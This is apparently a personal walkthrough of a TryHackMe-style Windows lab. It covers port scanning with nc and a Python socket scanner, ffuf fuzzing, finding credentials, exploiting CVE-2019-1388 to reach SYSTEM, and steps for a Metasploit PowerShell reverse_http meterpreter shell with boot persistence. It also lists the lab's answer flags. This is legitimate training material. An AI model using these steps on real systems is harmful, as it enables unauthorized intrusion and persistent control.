
How many ports are open on our target system?

possible to use `nc` but is very slow

```bash
nc -zv 0.0.0.0 1-1000
```

python makes more faster but still slow

```python
import socket
import time


def scanner(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((ip, port))
        print(f"[!] Port {port} is open")
    except socket.timeout:
        pass
    except socket.error:
        pass
    finally:
        sock.close()


def main():
    try:
        ip_addr = input("[~] Enter the IP address to scan: ")
        port_range = input("[~] Enter port range (separated by a comma ','): ").split(',')
        port_start = int(port_range[0])
        port_end = int(port_range[1])

        if port_start > port_end or port_start < 1 or port_end > 65535:
            raise ValueError("Invalid port range. Ports must be between 1 and 65535.")
        
        print(f"[~] Scanning {ip_addr} from port {port_start} to {port_end}...")

        start_time = time.time()
        for port in range(port_start, port_end + 1):
            scanner(ip_addr, port)
        end_time = time.time()

        print(f"\n[~] Scan completed in {end_time - start_time:.2f} seconds.")
        
    except ValueError as ve:
        print(f"[!] Error: {ve}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")


if __name__ == "__main__":
    main()
```

![[Captura desde 2024-09-16 14-23-46.png]]

**flag `2`**

Looks like there's a web server running, what is the title of the page we discover when browsing to it?

![[Captura desde 2024-09-16 13-11-20.png]]

**flag: `IIS Windows Server`**

Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?

```bash
ffuf -u http://0.0.0.0/FUZZ -w /etc/share/Wordlists/SecLists-master/Discovery/Web-Content/big.txt
```

![[Captura desde 2024-09-16 00-54-30.png]]

**flag: `/retro`**

Navigate to our discovered hidden directory, what potential username do we discover?

![[Captura desde 2024-09-16 13-06-58.png]]

**flag: `wade`**

Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

![[Captura desde 2024-09-16 12-01-26.png]]

**flag: `parzival`**

to connect remote machine remmina

![[Captura desde 2024-09-16 12-50-19.png]]

**flag: `THM{HACK_PLAYER_ONE}`**

When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

![[Captura desde 2024-09-16 14-02-39.png]]

**flag: `CVE-2019-1388`**

Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?

![[Captura desde 2024-09-16 14-05-34.png]]

**flag: `hhupd`**

Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!

https://www.youtube.com/watch?v=RW5l6dQ8H-8

Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?

**flag: `nt authority\system`**

Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!

![[Captura desde 2024-09-16 14-00-01.png]]

**flag: `THM{COIN_OPERATED_EXPLOITATION}`**

Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.



First, let's set the target to PSH (PowerShell). Which target number is PSH?


After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.


Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.


Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched. In this case, I've found it particularly helpful to host a simple python web server (python3 -m http.server) and host the command in a text file as copy and paste between the machines won't always work. Once you've run this command, return to our attacker machine and note that our reverse shell has spawned.


Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup.


Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!